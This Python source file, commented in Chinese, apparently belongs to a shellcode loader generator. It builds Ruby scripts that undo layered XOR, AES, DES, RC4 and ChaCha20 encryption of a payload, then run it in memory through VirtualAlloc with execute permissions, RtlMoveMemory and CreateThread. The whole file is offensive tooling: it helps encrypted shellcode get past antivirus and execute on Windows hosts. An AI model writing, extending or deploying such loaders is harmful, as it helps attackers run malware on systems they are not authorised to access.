#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ruby解密加载器模块：单一职责 - 仅实现Ruby解密加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader
from core.encrypt.encrypt_manager import EncryptionHistory

class RubyDecryptLoader(BaseLoader):
    """Ruby解密加载器：单一职责 - 仅生成Ruby解密加载器（适配加密历史）"""
    @property
    def lang_name(self) -> str:
        return "Ruby"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """（解密加载器可复用原始加载器逻辑）"""
        from core.loader.raw_loader.ruby_raw_loader import RubyRawLoader
        return RubyRawLoader().generate_raw(shellcode_len)
    
    def generate_decrypt(self, shellcode_len: int, encryption_history: EncryptionHistory) -> str:
        """生成Ruby解密加载器内容（适配XOR/AES-256-CBC/DES-CBC加密历史）"""
        encrypt_history = encryption_history.get_full_history()
        decrypt_functions = []
        decrypt_calls = []
        key_iv_definitions = []

        # 构建解密函数和调用逻辑（按加密逆序解密）
        for idx, encrypt_info in enumerate(reversed(encrypt_history), 1):
            alg = encrypt_info["alg"]
            params = encrypt_info["params"]

            if alg == "XOR":
                # XOR解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"# XOR解密密钥（第{idx}轮加密）\nxor_key_{idx} = [{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}]\nxor_key_len_{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                xor_decrypt = f"""# XOR解密函数（第{idx}轮）
def xor_decrypt_{idx}(shellcode)
    shellcode.each_with_index do |byte, i|
        shellcode[i] ^= xor_key_{idx}[i % xor_key_len_{idx}]
    end
    shellcode
end"""
                decrypt_functions.append(xor_decrypt)
                decrypt_calls.append(f"shellcode = xor_decrypt_{idx}(shellcode)")

            elif alg == "AES-256-CBC":
                # AES-256-CBC解密定义（依赖openssl）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"# AES-256-CBC解密密钥和IV（第{idx}轮加密）\naes_key_{idx} = [{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}].pack('C*')\naes_iv_{idx} = [{', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])}].pack('C*')"
                key_iv_definitions.append(key_def)

                aes_decrypt = f"""# AES-256-CBC解密函数（第{idx}轮，需安装：gem install openssl）
require 'openssl'

def aes_256_cbc_decrypt_{idx}(shellcode)
    begin
        cipher = OpenSSL::Cipher.new('AES-256-CBC')
        cipher.decrypt
        cipher.key = aes_key_{idx}
        cipher.iv = aes_iv_{idx}
        decrypted = cipher.update(shellcode.pack('C*'))
        decrypted += cipher.final
        
        # 将解密后的数据转换回数组格式
        result = decrypted.bytes.to_a
        result
    rescue => e
        puts "AES-256-CBC解密失败: #{{e.message}}"
        shellcode
    end
end"""
                decrypt_functions.append(aes_decrypt)
                decrypt_calls.append(f"shellcode = aes_256_cbc_decrypt_{idx}(shellcode)")

            elif alg == "DES-CBC":
                # DES-CBC解密定义（依赖openssl）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"# DES-CBC解密密钥和IV（第{idx}轮加密）\ndes_key_{idx} = [{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}].pack('C*')\ndes_iv_{idx} = [{', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])}].pack('C*')"
                key_iv_definitions.append(key_def)

                des_decrypt = f"""# DES-CBC解密函数（第{idx}轮，需安装：gem install openssl）
require 'openssl'

def des_cbc_decrypt_{idx}(shellcode)
    begin
        cipher = OpenSSL::Cipher.new('DES-CBC')
        cipher.decrypt
        cipher.key = des_key_{idx}
        cipher.iv = des_iv_{idx}
        decrypted = cipher.update(shellcode.pack('C*'))
        decrypted += cipher.final
        
        # 将解密后的数据转换回数组格式
        result = decrypted.bytes.to_a
        result
    rescue => e
        puts "DES-CBC解密失败: #{{e.message}}"
        shellcode
    end
end"""
                decrypt_functions.append(des_decrypt)
                decrypt_calls.append(f"shellcode = des_cbc_decrypt_{idx}(shellcode)")

            elif alg == "RC4":
                # RC4解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"# RC4解密密钥（第{idx}轮加密）\nrc4_key_{idx} = [{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}]\nrc4_key_len_{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                rc4_decrypt = f"""# RC4解密函数（第{idx}轮）
def rc4_decrypt_{idx}(shellcode)
    puts "RC4 decrypting shellcode..."
    # 初始化S盒
    s_box = (0..255).to_a
    j = 0
    for i in 0...256
        j = (j + s_box[i] + rc4_key_{idx}[i % rc4_key_len_{idx}]) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    end
    
    # 解密过程
    i = 0
    j = 0
    for k in 0...shellcode.length
        i = (i + 1) % 256
        j = (j + s_box[i]) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
        t = (s_box[i] + s_box[j]) % 256
        k_value = s_box[t]
        shellcode[k] ^= k_value
    end
    puts "RC4 decryption completed."
    shellcode
end"""
                decrypt_functions.append(rc4_decrypt)
                decrypt_calls.append(f"shellcode = rc4_decrypt_{idx}(shellcode)")

            elif alg == "ChaCha20":
                # ChaCha20解密定义（依赖openssl）
                key_hex = params["key_hex"]
                nonce_hex = params["nonce_hex"]
                key_def = f"# ChaCha20解密密钥和Nonce（第{idx}轮加密）\nchacha20_key_{idx} = [{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}].pack('C*')\nchacha20_nonce_{idx} = [{', '.join([f'0x{nonce_hex[i:i+2]}' for i in range(0, len(nonce_hex), 2)])}].pack('C*')"
                key_iv_definitions.append(key_def)

                # 使用字符串拼接避免Python解析Ruby变量
                chacha20_decrypt = "# ChaCha20解密函数（第" + str(idx) + "轮，需安装：gem install openssl）\n"
                chacha20_decrypt += "require 'openssl'\n\n"
                chacha20_decrypt += "def chacha20_decrypt_" + str(idx) + "(shellcode)\n"
                chacha20_decrypt += "    # 注意：Ruby的OpenSSL可能需要较新版本才能支持ChaCha20\n"
                chacha20_decrypt += "    begin\n"
                chacha20_decrypt += "        cipher = OpenSSL::Cipher.new('ChaCha20')\n"
                chacha20_decrypt += "        cipher.decrypt\n"
                chacha20_decrypt += "        cipher.key = chacha20_key_" + str(idx) + "\n"
                chacha20_decrypt += "        cipher.iv = chacha20_nonce_" + str(idx) + "\n"
                chacha20_decrypt += "        decrypted = cipher.update(shellcode.pack('C*')) + cipher.final\n"
                chacha20_decrypt += "        decrypted.unpack('C*')\n"
                chacha20_decrypt += "    rescue => err\n"
                chacha20_decrypt += '        puts "Error: #{err.message}"\n'
                chacha20_decrypt += "        puts \"ChaCha20 may not be supported in your OpenSSL version\"\n"
                chacha20_decrypt += "        shellcode\n"
                chacha20_decrypt += "    end\n"
                chacha20_decrypt += "end\n"
                decrypt_functions.append(chacha20_decrypt)
                decrypt_calls.append(f"shellcode = chacha20_decrypt_{idx}(shellcode)")

        # 拼接完整加载器内容
        # 使用字符串拼接而不是字符串格式化，避免Python解析Ruby代码中的变量
        full_decrypt_content = 'require "win32/api"\n'
        full_decrypt_content += '\n\n'.join(key_iv_definitions)
        full_decrypt_content += '\n\n'
        full_decrypt_content += '\n\n'.join(decrypt_functions)
        full_decrypt_content += '\n\n'
        full_decrypt_content += '# 定义Windows API常量\n'
        full_decrypt_content += 'MEM_COMMIT = 0x1000\n'
        full_decrypt_content += 'MEM_RESERVE = 0x2000\n'
        full_decrypt_content += 'PAGE_EXECUTE_READWRITE = 0x40\n'
        full_decrypt_content += 'INFINITE = 0xFFFFFFFF\n\n'
        full_decrypt_content += '# 加载Windows API函数\n'
        full_decrypt_content += 'virtual_alloc = Win32::API.new("kernel32", "VirtualAlloc", "LPLL", "L")\n'
        full_decrypt_content += 'rtl_move_memory = Win32::API.new("kernel32", "RtlMoveMemory", "LLL", "V")\n'
        full_decrypt_content += 'create_thread = Win32::API.new("kernel32", "CreateThread", "LPLLPL", "L")\n'
        full_decrypt_content += 'wait_for_single_object = Win32::API.new("kernel32", "WaitForSingleObject", "LL", "L")\n'
        full_decrypt_content += 'virtual_free = Win32::API.new("kernel32", "VirtualFree", "LLL", "B")\n'
        full_decrypt_content += 'close_handle = Win32::API.new("kernel32", "CloseHandle", "L", "B")\n\n'
        full_decrypt_content += 'def main\n'
        full_decrypt_content += '    # 占位符：替换为你的加密后格式化shellcode\n'
        full_decrypt_content += '    shellcode = [/* 此处填入字节数组格式shellcode */]\n'
        full_decrypt_content += f'    shellcode_len = {shellcode_len}\n\n'
        full_decrypt_content += '    # 执行解密（按加密逆序）\n'
        full_decrypt_content += '    ' + '\n    '.join(decrypt_calls) + '\n\n'
        full_decrypt_content += '    # 刷新shellcode长度（解密后可能变化）\n'
        full_decrypt_content += '    shellcode_len = shellcode.length\n\n'
        full_decrypt_content += '    # 分配可执行内存\n'
        full_decrypt_content += '    mem = virtual_alloc.call(nil, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n'
        full_decrypt_content += '    if mem == 0\n'
        full_decrypt_content += '        puts "VirtualAlloc failed"\n'
        full_decrypt_content += '        return\n'
        full_decrypt_content += '    end\n\n'
        full_decrypt_content += '    # 复制解密后的shellcode到内存\n'
        full_decrypt_content += '    shellcode_ptr = shellcode.pack("C*").pointer\n'
        full_decrypt_content += '    rtl_move_memory.call(mem, shellcode_ptr, shellcode_len)\n\n'
        full_decrypt_content += '    # 创建线程执行shellcode\n'
        full_decrypt_content += '    h_thread = create_thread.call(nil, 0, mem, nil, 0, nil)\n'
        full_decrypt_content += '    if h_thread == 0\n'
        full_decrypt_content += '        puts "CreateThread failed"\n'
        full_decrypt_content += '        virtual_free.call(mem, 0, 0x8000) # MEM_RELEASE\n'
        full_decrypt_content += '        return\n'
        full_decrypt_content += '    end\n\n'
        full_decrypt_content += '    # 等待线程执行完成\n'
        full_decrypt_content += '    wait_for_single_object.call(h_thread, INFINITE)\n\n'
        full_decrypt_content += '    # 清理资源\n'
        full_decrypt_content += '    close_handle.call(h_thread)\n'
        full_decrypt_content += '    virtual_free.call(mem, 0, 0x8000)\n'
        full_decrypt_content += 'end\n\n'
        full_decrypt_content += '# 执行主函数\n'
        full_decrypt_content += 'begin\n'
        full_decrypt_content += '    main\n'
        full_decrypt_content += 'rescue => e\n'
        full_decrypt_content += '    puts "Error: " + e.message\n'
        full_decrypt_content += 'end\n'

        return full_decrypt_content
